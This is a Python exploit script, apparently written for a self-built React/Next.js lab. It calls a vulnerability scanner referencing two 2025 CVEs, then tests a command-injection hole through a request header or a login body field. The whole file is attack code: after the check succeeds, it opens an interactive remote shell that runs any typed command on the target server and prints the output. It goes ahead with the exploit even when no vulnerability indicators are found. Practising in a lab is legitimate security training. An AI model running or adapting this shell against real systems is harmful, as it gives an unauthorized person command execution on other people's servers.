#!/usr/bin/env python3
"""
react_nextjs_shell.py - Exploit / Web Shell for demonstrated RCE vulnerability
Use with generated lab environment.

Author: FurkanKAYAPINAR
GitHub: github.com/FurkanKAYAPINAR
LinkedIn: linkedin.com/in/FurkanKAYAPINAR

Usage:
  python3 react_nextjs_shell.py http://127.0.0.1:8080
"""

import argparse
import requests
import sys
import time
import urllib3
import react_nextjs_scanner  # Import the scanner module

# Suppress insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(url):
    """
    Checks if the target is vulnerable by trying to run 'echo vulnerable'
    """
    check_cmd = "echo vulnerable"
    target_url = f"{url.rstrip('/')}/api/users/login"
    
    print(f"\n[*] verifying RCE exploitability on {target_url}...")
    
    try:
        # Try injecting via Header
        headers = {"x-shell-cmd": check_cmd}
        # Also send dummy body to satisfy potential parsers
        data = {"username": "admin", "password": "password"}
        
        r = requests.post(target_url, json=data, headers=headers, timeout=5, verify=False)
        
        if r.status_code == 200 and "vulnerable" in r.text:
            print("[+] Target is VULNERABLE! (Response matched)")
            return True, "header"
            
        # Try injecting via Body (as fallback if header fails but we implemented both)
        data['shell_cmd'] = check_cmd
        r = requests.post(target_url, json=data, timeout=5, verify=False)
        if r.status_code == 200 and "vulnerable" in r.text:
             print("[+] Target is VULNERABLE! (Body Trigger)")
             return True, "body"

    except Exception as e:
        print(f"[-] RCE Check failed: {e}")
        return False, None
        
    print("[-] Target does not appear vulnerable to this specific RCE.")
    return False, None

def run_shell(url, trigger_type):
    """
    Starts an interactive pseudo-shell
    """
    target_url = f"{url.rstrip('/')}/api/users/login"
    print("\n[+] Starting interactive shell. Type 'exit' to quit.\n")
    
    while True:
        try:
            cmd = input("Shell> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ["exit", "quit"]:
                break
                
            # Prepare payload based on what worked
            headers = {}
            data = {"username": "hacker"}
            
            if trigger_type == "header":
                headers["x-shell-cmd"] = cmd
            else:
                data["shell_cmd"] = cmd
                
            r = requests.post(target_url, json=data, headers=headers, timeout=10, verify=False)
            
            if r.text:
                print(r.text)
            else:
                print("(No output)")
                
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="React/Next.js Lab RCE Shell + Scanner")
    parser.add_argument("url", help="Target URL (e.g. http://localhost:8080)")
    parser.add_argument("--skip-scan", action="store_true", help="Skip the heuristic scan and go straight to exploit")
    args = parser.parse_args()
    
    # Run the scanner first unless skipped
    if not args.skip_scan:
        print(f"[*] Starting heuristic scan on {args.url}...")
        try:
            # Use the imported scanner logic
            base_url = react_nextjs_scanner.build_base_url(args.url, None)
            responses = react_nextjs_scanner.probe_targets(base_url, timeout=5, verify=False)
            findings = react_nextjs_scanner.analyze_responses(responses)
            react_nextjs_scanner.print_report(base_url, findings)
            
            # Check if any indicators were found to encourage the user
            if findings["cve_2025_55182"]["indicator"] or findings["cve_2025_66478"]["indicator"]:
                print("\n[!] Vulnerability indicators found! Proceeding to exploitation phase...")
            else:
                print("\n[*] No obvious indicators found, but attempting exploit anyway...")
        except Exception as e:
            print(f"[-] Scan encountered an error: {e}")
            print("[*] Proceeding to exploitation phase...")

    # Now verify the RCE
    is_vuln, trigger = check_vulnerability(args.url)
    
    if is_vuln:
        run_shell(args.url, trigger)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
